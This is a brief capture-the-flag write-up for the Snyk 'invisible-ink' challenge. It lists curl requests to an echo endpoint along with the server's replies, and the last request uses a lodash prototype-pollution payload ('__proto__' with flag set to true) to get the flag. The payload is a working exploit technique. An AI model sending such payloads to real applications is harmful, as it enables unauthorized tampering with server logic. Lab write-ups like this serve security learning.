website URL: http://invisible-ink.c.ctf-snyk.io/

curl -X POST http://invisible-ink.c.ctf-snyk.io/echo -d "{\"message\":\"Hello World\"}"

* returns {"userID":"156.146.47.195, 34.117.102.82","time":1680376857685,"flag":"disabled"}



curl -X POST -H "Content-type: application/json" http://invisible-ink.c.ctf-snyk.io/echo -d "{\"message\":\"Hello World\"}"

* returns {"userID":"156.146.47.195, 34.117.102.82","time":1680376914919,"message":"Hello World","flag":"disabled"}



curl -X POST -H "Content-type: application/json" http://invisible-ink.c.ctf-snyk.io/echo -d "{\"message\":\"Hello World\", \"flag\": \"enabled\"}"

*returns {"userID":"156.146.47.195, 34.117.102.82","time":1680377610707,"message":"Hello World","flag":"disabled"}



After running "synk test", we see vulnerability of prototype pollution of javascript dependency, "lodash" and we find we can use __proto__ (https://security.snyk.io/vuln/SNYK-JS-LODASH-608086)

curl -X POST -H "Content-type: application/json" http://invisible-ink.c.ctf-snyk.io/echo -d "{\"message\":\"helloot\", \"__proto__\":{\"flag\":true}}"

*returns {"userID":"156.146.47.195, 34.117.102.82","time":1680377904963,"message":"helloot","flag":"SNYK{6a6a6fff87f3cfdca056a077804838d4e87f25f6a11e09627062c06f142b10dd}"}